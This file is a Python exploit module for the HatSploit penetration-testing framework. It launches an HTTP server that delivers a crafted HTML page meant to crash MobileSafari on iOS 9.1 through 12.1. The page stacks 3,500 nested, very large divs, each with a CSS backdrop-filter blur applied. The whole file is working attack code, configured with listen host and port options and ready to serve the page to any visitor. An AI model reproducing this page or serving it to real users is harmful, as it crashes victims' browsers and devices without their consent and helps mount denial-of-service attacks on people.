#!/usr/bin/env python3

#
# This module requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from hatsploit.lib.module import Module
from hatsploit.utils.http import HTTPClient
from hatsploit.utils.tcp import TCPClient


class HatSploitModule(Module, HTTPClient, TCPClient):
    details = {
        'Name': "iPhoneOS Safari WebKit Filter DoS",
        'Module': "exploit/iphoneos/safari/webkit_filter_dos",
        'Authors': [
            'Ivan Nikolsky (enty8080)',
            'Sabri Haddouche (pwnsdx)'
        ],
        'Description': "iPhoneOS 9.1 till 12.1 MobileSafari.app WebKit Filter DoS.",
        'Comments': [
            ''
        ],
        'Platform': "iphoneos",
        'Risk': "high"
    }

    options = {
        'LHOST': {
            'Description': "Local host.",
            'Value': TCPClient.get_local_host(),
            'Type': "ip",
            'Required': True
        },
        'LPORT': {
            'Description': "Local port.",
            'Value': 80,
            'Type': "port",
            'Required': True
        },
        'FOREVER': {
            'Description': "Start http server forever.",
            'Value': "no",
            'Type': "boolean",
            'Required': False
        }
    }

    @staticmethod
    def generate():
        div_line = '<div>' * 3500 + '</div>' * 3500

        payload = """
        <html>
            <head>
                <meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
                <style>
                    div {
                        backdrop-filter: blur(10px);
                        -webkit-backdrop-filter: blur(10px);
                        width:10000px; height:10000px;
                    }
                </style>
            </head>
            <body>
                """ + div_line + """
            </body>
        </html>
        """

        return payload

    def run(self):
        local_host, local_port, forever = self.parse_options(self.options)

        payload = self.generate()
        self.start_server(local_host, local_port, payload, True if forever.lower() in ['yes', 'y'] else False)
